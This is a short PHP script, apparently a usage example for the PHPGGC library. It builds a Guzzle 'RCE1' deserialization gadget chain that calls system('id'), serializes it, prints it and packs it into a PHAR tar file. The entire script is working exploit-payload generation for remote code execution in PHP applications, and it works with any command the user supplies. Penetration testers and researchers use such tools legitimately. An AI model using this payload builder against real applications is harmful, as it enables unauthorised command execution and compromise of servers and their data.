<?php

# Include PHPGGC
include("phpggc/lib/PHPGGC.php");

# Include guzzle/rce1
$gc = new \GadgetChain\Guzzle\RCE1();

# Always process parameters unless you're doing something out of the ordinary
$parameters = $gc->process_parameters([
	'function' => 'system',
	'parameter' => 'id',
]);

# Generate the payload
$object = $gc->generate($parameters);

# Most (if not all) GC's do not use process_object and process_serialized, so
# for quick & dirty code you can omit those two 
$object = $gc->process_object($object);

# Serialize the payload
$serialized = serialize($object);
$serialized = $gc->process_serialized($serialized);

# Display it
print($serialized . "\n");

# Create a PHAR file from this payload
$phar = new \PHPGGC\Phar\Tar($serialized);
file_put_contents('output.phar.tar', $phar->generate());
